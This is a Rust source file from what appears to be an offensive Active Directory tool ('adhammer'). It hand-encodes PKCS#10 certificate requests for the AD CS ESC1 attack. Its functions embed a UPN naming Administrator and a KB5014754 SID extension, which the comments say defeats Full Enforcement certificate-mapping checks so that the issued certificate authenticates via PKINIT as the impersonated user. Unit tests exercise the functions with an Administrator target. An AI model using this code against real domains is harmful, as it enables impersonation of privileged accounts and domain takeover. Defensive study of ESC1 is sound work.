//! PKCS#10 certificate-signing request (RFC 2986) with an optional UPN `otherName` SAN — the
//! ESC1 abuse primitive: on an enrollee-supplies-subject template the CA honors this SAN, so a
//! CSR carrying `otherName=Administrator@realm` yields a client-auth cert usable to PKINIT as
//! that user. Hand-rolled DER (signed SHA-256/RSA) so it stays on the existing `rsa` dep.

use anyhow::Result;
use rsa::pkcs8::EncodePrivateKey;
use rsa::traits::PublicKeyParts;
use rsa::{Pkcs1v15Sign, RsaPrivateKey};
use sha2::{Digest, Sha256};

// ---- minimal DER ----
fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        return vec![n as u8];
    }
    let mut b = n.to_be_bytes().to_vec();
    while b.len() > 1 && b[0] == 0 {
        b.remove(0);
    }
    let mut o = vec![0x80 | b.len() as u8];
    o.extend(b);
    o
}
fn tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![tag];
    o.extend(der_len(content.len()));
    o.extend_from_slice(content);
    o
}
fn seq(c: &[u8]) -> Vec<u8> {
    tlv(0x30, c)
}
fn set(c: &[u8]) -> Vec<u8> {
    tlv(0x31, c)
}
fn ctx(n: u8, c: &[u8]) -> Vec<u8> {
    tlv(0xA0 | n, c) // constructed context-specific [n]
}
fn oid(parts: &[u32]) -> Vec<u8> {
    let mut b = vec![(parts[0] * 40 + parts[1]) as u8];
    for &p in &parts[2..] {
        let mut stack = vec![(p & 0x7f) as u8];
        let mut v = p >> 7;
        while v > 0 {
            stack.push((v & 0x7f) as u8 | 0x80);
            v >>= 7;
        }
        stack.reverse();
        b.extend(stack);
    }
    tlv(0x06, &b)
}
fn int_bytes(mut b: Vec<u8>) -> Vec<u8> {
    if b.is_empty() {
        b.push(0);
    }
    if b[0] & 0x80 != 0 {
        b.insert(0, 0);
    }
    tlv(0x02, &b)
}
fn bit_string(c: &[u8]) -> Vec<u8> {
    let mut v = vec![0u8]; // 0 unused bits
    v.extend_from_slice(c);
    tlv(0x03, &v)
}
fn utf8(s: &str) -> Vec<u8> {
    tlv(0x0c, s.as_bytes())
}
fn null() -> Vec<u8> {
    vec![0x05, 0x00]
}

/// A generated CSR: DER bytes + the PKCS#8 PEM private key (for later PKINIT).
pub struct Csr {
    pub der: Vec<u8>,
    pub key_pem: String,
}

/// Encode `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2) — the KB5014754 strong-mapping
/// extension. Given a target user's SID string (`"S-1-5-21-…-500"`), returns the extension VALUE
/// (contents of the extnValue OCTET STRING), which is the DER of:
///
/// ```text
/// SEQUENCE {                      -- one-entry GeneralNames
///   [0] IMPLICIT {                -- otherName (GeneralName choice)
///     OID 1.3.6.1.4.1.311.25.2.1,
///     [0] EXPLICIT { OCTET STRING <SID as ASCII bytes> }
///   }
/// }
/// ```
///
/// When this extension rides in the issued cert, Windows 2019+/KB5014754 KDCs read the SID as
/// authoritative and PKINIT succeeds even under Full Enforcement (Feb 2025 default). Without it,
/// modern KDCs return `KDC_ERR_CERTIFICATE_MISMATCH` (RFC 4556 §3.2.3 code 66).
fn build_sid_ext_value(sid: &str) -> Vec<u8> {
    let inner_octet = tlv(0x04, sid.as_bytes()); // OCTET STRING <SID ascii>
    let value_explicit = ctx(0, &inner_octet); // [0] EXPLICIT
    let type_id = oid(&[1, 3, 6, 1, 4, 1, 311, 25, 2, 1]);
    let other_name = ctx(0, &[type_id, value_explicit].concat()); // [0] IMPLICIT otherName
    seq(&other_name) // GeneralNames wrapper
}

/// Build a PKCS#10 CSR for `subject_cn`, optionally embedding `upn` as an `otherName` SAN.
///
/// Thin wrapper around [`build_csr_with_sid_ext`] with no KB5014754 SID extension. Existing
/// callers stay source-compatible; new callers that need the strong-mapping extension use
/// [`build_csr_with_sid_ext`] directly.
pub fn build_csr(subject_cn: &str, upn: Option<&str>) -> Result<Csr> {
    build_csr_with_sid_ext(subject_cn, upn, None)
}

/// Build a PKCS#10 CSR with an optional UPN SAN AND the KB5014754 SID mapping extension.
///
/// When `target_sid` is `Some`, the CSR carries the `szOID_NTDS_CA_SECURITY_EXT` extension. If the
/// CA copies the extension into the issued cert (Windows 2019+ CAs do by default), the resulting
/// cert PKINITs cleanly against Full-Enforcement KDCs. `target_sid` is the target USER's SID (not
/// the domain SID) as ASCII — e.g. `"S-1-5-21-…-500"` for Administrator.
pub fn build_csr_with_sid_ext(
    subject_cn: &str,
    upn: Option<&str>,
    target_sid: Option<&str>,
) -> Result<Csr> {
    let mut rng = rand::thread_rng();
    let key = RsaPrivateKey::new(&mut rng, 2048)?;
    let pk = key.to_public_key();

    // SubjectPublicKeyInfo { rsaEncryption NULL, BIT STRING(RSAPublicKey{n,e}) }
    let rsa_pub = seq(&[
        int_bytes(pk.n().to_bytes_be()),
        int_bytes(pk.e().to_bytes_be()),
    ]
    .concat());
    let alg_rsa = seq(&[oid(&[1, 2, 840, 113549, 1, 1, 1]), null()].concat());
    let spki = seq(&[alg_rsa, bit_string(&rsa_pub)].concat());

    // Name { CN=subject_cn }
    let rdn = set(&seq(&[oid(&[2, 5, 4, 3]), utf8(subject_cn)].concat()));
    let name = seq(&rdn);

    // attributes [0] IMPLICIT SET OF Attribute — extensionRequest carrying (a) an optional SAN
    // extension with the UPN otherName, and (b) an optional szOID_NTDS_CA_SECURITY_EXT extension
    // with the target user's SID (KB5014754 strong mapping). Emit whichever are present; skip
    // the attributes block entirely when neither is set (relay ESC8/11 CSR paths).
    let mut ext_list: Vec<u8> = Vec::new();
    if let Some(u) = upn {
        // SAN extension — otherName: [0]{ type-id UPN-OID, value [0] EXPLICIT UTF8String }
        let other = ctx(
            0,
            &[oid(&[1, 3, 6, 1, 4, 1, 311, 20, 2, 3]), ctx(0, &utf8(u))].concat(),
        );
        let san = seq(&other); // SubjectAltName ::= SEQUENCE OF GeneralName
        let san_ext = seq(&[oid(&[2, 5, 29, 17]), tlv(0x04, &san)].concat()); // Extension{OID, OCTET STRING}
        ext_list.extend(san_ext);
    }
    if let Some(sid) = target_sid {
        // szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) — KB5014754 strong mapping.
        let sid_value = build_sid_ext_value(sid);
        let sid_ext = seq(&[oid(&[1, 3, 6, 1, 4, 1, 311, 25, 2]), tlv(0x04, &sid_value)].concat());
        ext_list.extend(sid_ext);
    }
    let attributes = if ext_list.is_empty() {
        ctx(0, &[])
    } else {
        let exts = seq(&ext_list); // SEQUENCE OF Extension
        let attr = seq(&[oid(&[1, 2, 840, 113549, 1, 9, 14]), set(&exts)].concat()); // extensionRequest
        ctx(0, &attr)
    };

    // CertificationRequestInfo { version 0, subject, SPKI, attributes }
    let cri = seq(&[int_bytes(vec![0]), name, spki, attributes].concat());

    // signatureAlgorithm sha256WithRSAEncryption; signature over DER(cri).
    let sig = key.sign(Pkcs1v15Sign::new::<Sha256>(), &Sha256::digest(&cri))?;
    let sig_alg = seq(&[oid(&[1, 2, 840, 113549, 1, 1, 11]), null()].concat());
    let csr = seq(&[cri, sig_alg, bit_string(&sig)].concat());

    let key_pem = key.to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)?.to_string();
    Ok(Csr { der: csr, key_pem })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn csr_is_wellformed_der_sequence() {
        let c = build_csr("adhammer", Some("Administrator@corp.local")).unwrap();
        assert_eq!(c.der[0], 0x30); // outer SEQUENCE
        assert!(c.der.len() > 400); // 2048-bit key ⇒ sizeable
        assert!(c.key_pem.contains("BEGIN PRIVATE KEY"));
    }

    #[test]
    fn dump_csr_for_external_validation() {
        // Gated: `ADHAMMER_CSR_OUT=path cargo test -p adhammer-kerberos dump_csr` writes a CSR
        // for offline validation (openssl / python cryptography). No-op otherwise.
        if let Ok(path) = std::env::var("ADHAMMER_CSR_OUT") {
            let c = build_csr("adhammer", Some("Administrator@corp.local")).unwrap();
            std::fs::write(&path, &c.der).unwrap();
        }
    }

    #[test]
    fn oid_encoding_upn() {
        // 1.3.6.1.4.1.311.20.2.3 → 2b 06 01 04 01 82 37 14 02 03
        let o = oid(&[1, 3, 6, 1, 4, 1, 311, 20, 2, 3]);
        assert_eq!(
            &o[2..],
            &[0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03]
        );
    }

    #[test]
    fn sid_ext_value_matches_kb5014754_shape() {
        // szOID_NTDS_CA_SECURITY_EXT value: SEQUENCE { [0] IMPLICIT { OID, [0] EXPLICIT OCTET STRING } }
        let sid = "S-1-5-21-1-2-3-500";
        let v = build_sid_ext_value(sid);
        // Outer SEQUENCE
        assert_eq!(v[0], 0x30, "outer tag must be SEQUENCE");
        // First inner tag must be [0] IMPLICIT CONSTRUCTED = 0xA0
        // (der_len is a single byte for this small payload, so v[1]=len and v[2]=next tag)
        assert_eq!(
            v[2], 0xA0,
            "otherName must use IMPLICIT [0] constructed tag"
        );
        // The 1.3.6.1.4.1.311.25.2.1 OID must be present verbatim
        let sub_oid: &[u8] = &[
            0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02, 0x01,
        ];
        assert!(
            v.windows(sub_oid.len()).any(|w| w == sub_oid),
            "expected sub-OID .25.2.1 in encoded value"
        );
        // The SID ASCII bytes must appear verbatim inside the OCTET STRING
        assert!(
            v.windows(sid.len()).any(|w| w == sid.as_bytes()),
            "SID string must appear verbatim in extension value"
        );
    }

    #[test]
    fn csr_with_sid_ext_carries_both_extensions() {
        let c = build_csr_with_sid_ext(
            "adhammer",
            Some("Administrator@corp.local"),
            Some("S-1-5-21-1-2-3-500"),
        )
        .unwrap();
        // Outer PKCS#10 SEQUENCE
        assert_eq!(c.der[0], 0x30);
        // The SAN extension OID (2.5.29.17) must be present
        let san_oid: &[u8] = &[0x06, 0x03, 0x55, 0x1d, 0x11];
        assert!(
            c.der.windows(san_oid.len()).any(|w| w == san_oid),
            "SAN extension missing"
        );
        // The szOID_NTDS_CA_SECURITY_EXT top-level OID (1.3.6.1.4.1.311.25.2) must be present
        let sid_ext_oid: &[u8] = &[
            0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02,
        ];
        assert!(
            c.der.windows(sid_ext_oid.len()).any(|w| w == sid_ext_oid),
            "SID extension missing"
        );
    }

    #[test]
    fn csr_without_extensions_keeps_empty_attributes() {
        // Relay ESC8/ESC11 path: no UPN, no SID — must still produce a valid CSR
        // whose attributes block is the empty [0] tag (backward compat).
        let c = build_csr("adhammer-esc8", None).unwrap();
        assert_eq!(c.der[0], 0x30);
        assert!(c.der.len() > 300);
    }
}
